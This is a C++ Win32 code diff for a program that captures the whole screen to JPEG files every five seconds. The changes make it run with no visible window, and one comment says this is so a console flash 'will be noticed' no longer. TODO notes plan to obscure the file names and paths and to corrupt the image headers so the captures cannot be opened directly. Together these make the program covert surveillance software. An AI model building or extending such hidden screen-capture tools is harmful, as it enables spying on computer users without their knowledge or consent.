@@ -42,7 +42,6 @@ int GetEncoderClsid(const WCHAR* format, CLSID* pClsid)
 void BitmapToJpg(HBITMAP hbmpImage, int width, int height, LPCWSTR filename, ULONG uQuality)
 {
 	Bitmap *p_bmp = Bitmap::FromHBITMAP(hbmpImage, NULL);
-	//Bitmap *p_bmp = new Bitmap(width, height, PixelFormat32bppARGB);
 
 	CLSID pngClsid;
 	EncoderParameters encoderParams;
@@ -57,6 +56,8 @@ void BitmapToJpg(HBITMAP hbmpImage, int width, int height, LPCWSTR filename, ULO
 	else
 		std::cout << "Encoder failed" << std::endl;
 	p_bmp->Save(filename , &pngClsid, &encoderParams);
+	//TODO make the file unable to be opened directly,
+	//such as modify the JPEG file header (the first 9 bytes) and change the file extension
 	delete p_bmp;
 }
 
@@ -85,6 +86,7 @@ void getNowTime(char *buffer) {
 				sys.wYear, sys.wMonth, sys.wDay, sys.wHour, sys.wMinute, sys.wSecond);
 }
 
+//TODO add a global hotkey to call this function
 void timerWork()
 {
 	CString filename;
@@ -92,6 +94,7 @@ void timerWork()
 	char *time = new char[24];
 	getNowTime(time);
 	filename += time;
+	//TODO obscure the file name and directory path
 
 	int width = GetSystemMetrics(SM_CXSCREEN);
 	int height = GetSystemMetrics(SM_CYSCREEN);
@@ -100,18 +103,26 @@ void timerWork()
 	ScreenCapture(0, 0, width, height, filename.GetString(), 100L);
 }
 
-int main() {
+int _real_main() {
 	GdiplusStartupInput gdiplusStartupInput;
 	ULONG_PTR gdiplusToken;
 	GdiplusStartup(&gdiplusToken, &gdiplusStartupInput, NULL);
 	while (true) {
 		timerWork();
 		Sleep(5000);
+		//TODO make the time duration adjustable
 	}
 	GdiplusShutdown(gdiplusToken);
 	return 0;
 }
 
+/*
+Please note that this is the real entry point of the funcion as an Win32 application.
+If you directly use main() and compile it as an console application, the console window will
+always show up at startup. Even if you hide it in the first line of code, it will still cause
+an unpleasing flash of black window and will be noticed.
+*/
 int __stdcall _tWinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPTSTR lpCmdLine, int nCmdShow) {
-	main();
+	//TODO add an window to configure the behavior if no configuration file exists.
+	_real_main();
 }
